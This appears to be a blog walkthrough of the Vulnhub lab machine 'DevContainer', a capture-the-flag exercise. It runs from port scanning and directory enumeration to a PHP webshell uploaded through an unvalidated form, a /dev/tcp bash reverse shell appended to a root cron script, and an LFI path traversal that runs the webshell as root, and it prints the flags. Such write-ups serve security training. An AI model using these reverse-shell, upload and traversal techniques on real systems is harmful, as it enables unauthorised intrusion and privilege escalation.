<!DOCTYPE html>
<html><head><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.6/mermaid.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}});</script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/latest.js?config=TeX-MML-AM_CHTML"></script><link rel="stylesheet" href="static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><link rel="stylesheet" href="static/light.css"/></head><body>
<a href="../boxesfolder.html" style="padding: 5px; color: black; position: absolute;">BACK</a><br>
<img src="images/crazyeights.png" style="display: block; padding: 5px 0px; width: 50%; margin: auto; margin-top: 5px;">
<h1>Vulnhub: DevContainer:</h1>
<h6>Oct 20</h6>
<h3>Scanning:</h3>
<pre><code>Nmap scan report for 192.168.56.123
Host is up (0.00017s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
</code></pre>
<h4>More Scanning:</h4>
<pre><code>crazyeights@es-base:~$ nmap -A -p- 192.168.56.123
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 13:03 EDT
Nmap scan report for 192.168.56.123
Host is up (0.000096s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Freelancer - Start Bootstrap Theme
</code></pre>
<h3>Web</h3>
<img src="images/dc1.png" style="width:90%">
<h3>Web Enum:</h3>
<pre><code>crazyeights@es-base:~$ dirb http://192.168.56.123

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Oct 24 13:04:52 2020
URL_BASE: http://192.168.56.123/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.123/ ----
==&gt; DIRECTORY: http://192.168.56.123/css/                                      
==&gt; DIRECTORY: http://192.168.56.123/fonts/                                    
==&gt; DIRECTORY: http://192.168.56.123/img/                                      
+ http://192.168.56.123/index.html (CODE:200|SIZE:27263)                       
==&gt; DIRECTORY: http://192.168.56.123/js/                                       
+ http://192.168.56.123/license (CODE:200|SIZE:11336)                          
==&gt; DIRECTORY: http://192.168.56.123/mail/                                     
+ http://192.168.56.123/server-status (CODE:403|SIZE:279)                      
==&gt; DIRECTORY: http://192.168.56.123/upload/                                   
[SNIP]                                                                               
---- Entering directory: http://192.168.56.123/upload/files/ ----
                                                                               
-----------------
END_TIME: Sat Oct 24 13:05:02 2020
DOWNLOADED: 41508 - FOUND: 4
crazyeights@es-base:~$ 
</code></pre>
<h3>File Upload Dir:</h3>
<img src="images/dc2.png" style="width:90%">
<ul>
<li>Doesn't look like they every did file extension validation:</li>
</ul>
<pre><code>&lt;title&gt;In construction&lt;/title&gt;
Allowed file types: jpg,gif,png,zip,txt,xls,doc
&lt;!--I need to validate file extensions--&gt;
</code></pre>
<h3>Testing the upload functionality:</h3>
<ul>
<li>To find the directory where the file gets uploaded to</li>
<img src="images/dc3.png" style="width:90%">
</ul>
<p>File gets uploaded to:</p>
<pre><code>http://192.168.56.123/upload/files/playing-card-icon-png-favpng-4y5r4Fw9K8A5vPjnaZyCfKsGN.jpg
</code></pre>
<p>Testing uploading a php file:</p>
<ul>
<li>Using a webshell, because I am curious if it will work.</li>
</ul>
<pre><code>http://192.168.56.123/upload/files/caf7e7bf96a799f0547469cb698bfb68.php
</code></pre>
<h3>Neat:</h3>
<img src="images/dc4.png" style="width:90%">
<h3>Now for proper reverse shell:</h3>
<ul>
<li>Using pentest monkey php reverse shell</li>
<li>Start listener:</li>
</ul>
<pre><code>crazyeights@es-base:~$ nc -lvp 1234
listening on [any] 1234 ...
</code></pre>
<img src="images/dc5.png" style="width:90%">
<ul>
<li>www-data shell:</li>
</ul>
<pre><code>connect to [192.168.56.1] from (UNKNOWN) [192.168.56.123] 37218
Linux 06502074cfda 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 17:13:03 up 11 min,  0 users,  load average: 0.04, 0.13, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
</code></pre>
<h5>In Maintenance-Web-Docker in www/html:</h5>
<pre><code>130351 -rwxrwxrwx  1 root root  164 Sep 13 04:23 list.sh
130349 -rwxr-xr-x  1 root root  204 Sep 12 21:31 maintenance.sh
130341 -rw-r--r--  1 1000 1000  442 Oct 24 17:15 out.txt
</code></pre>
<pre><code>$ cat list.sh
#!/bin/bash
date &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
ls /home/richard/web/upload/files/ | wc -l &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
</code></pre>
<p>The script is being run every minute:</p>
<pre><code>$ cat out.txt
[SNIP]
Sat 24 Oct 2020 01:13:01 PM EDT
2
Sat 24 Oct 2020 01:14:01 PM EDT
3
</code></pre>
<h5>Trying to use the list script to get elevated privileges:</h5>
<ul>
<li>Start a listener:</li>
</ul>
<pre><code>nc -lvp 9999
</code></pre>
<pre><code>$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/9999 0&gt;&amp;1&quot; &gt;&gt; list.sh
</code></pre>
<h3>Getting richard (user):</h3>
<pre><code>crazyeights@es-base:~$ nc -lvp 9999
listening on [any] 9999 ...
192.168.56.123: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.123] 45626
bash: cannot set terminal process group (1166): Inappropriate ioctl for device
bash: no job control in this shell
richard@EC2:~$ ls
ls
HackTools
user.txt
web
richard@EC2:~$ cat user.txt
cat user.txt
3a6b99f59ea363803bcafc7f5dd9b1e8
richard@EC2:~$ 
</code></pre>
<h4>Checking out web:</h4>
<p>There is a copy(?) of the site in www/html:</p>
<pre><code>richard@EC2:~$ cd web
cd web
richard@EC2:~/web$ ls
ls
css
font-awesome
fonts
img
index.html
js
less
license
mail
Maintenance-Web-Docker
readme.md
upload
</code></pre>
<h4>Checking out HackTools:</h4>
<pre><code>richard@EC2:~$ cd HackTools	
cd HackTools
richard@EC2:~/HackTools$ ls
ls
README.txt
socat
richard@EC2:~/HackTools$ cat README.txt
cat README.txt
Richard, it's annoying to lose bash, try:
( sudo socat [...] ) &amp;
</code></pre>
<p>As soon as I read <code>Richard, it's annoying to lose bash,</code>, i was like ohh noo what if I lose bash and have to start over...</p>
<h4>Checking if richard can run socat as root</h4>
<pre><code>richard@EC2:~/HackTools$ sudo -l
sudo -l
Matching Defaults entries for richard on EC2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on EC2:
    (ALL) NOPASSWD: /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork
        TCP\:127.0.0.1\:90
</code></pre>
<h4>Trying to run the command as user root:</h4>
<pre><code>richard@EC2:~/HackTools$ sudo -u root /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork TCP\:127.0.0.1\:90
</code></pre>
<h4>You can now access the development site at localhost:8080:</h4>
<img src="images/dc6.png" style="width:90%">
<h5>Looks like LFI:</h5>
<pre><code>http://192.168.56.123:8080/index.php?view=about-us.html
</code></pre>
<h3>Let's see if I can find my nifty webshell to reuse:</h3>
<ul>
<li>Since the maintenance script copies all uploads to richards web folder, reuse my shell with this process which is running as root.</li>
</ul>
<pre><code>http://192.168.56.123:8080/index.php?view=../../../../../../../../../home/richard/web/upload/files/caf7e7bf96a799f0547469cb698bfb68.php
</code></pre>
<h3>Neat:</h3>
<img src="images/dc7.png" style="width:90%">
<h5>Checking /root:</h5>
<img src="images/dc8.png" style="width:90%">
<h5>Getting root flag:</h5>
<img src="images/dc9.png" style="width:90%">
<pre><code> _    _      _ _       _                  _ 
| |  | |    | | |     | |                | |
| |  | | ___| | |   __| | ___  _ __   ___| |
| |/\| |/ _ \ | |  / _` |/ _ \| '_ \ / _ \ |
\  /\  /  __/ | | | (_| | (_) | | | |  __/_|
 \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___(_)
                                            
07f61ca07bc617f9639b412423b2cc6f
Twitter: @0x04E1
</code></pre>
<p>FIN.</p>
</body></html>
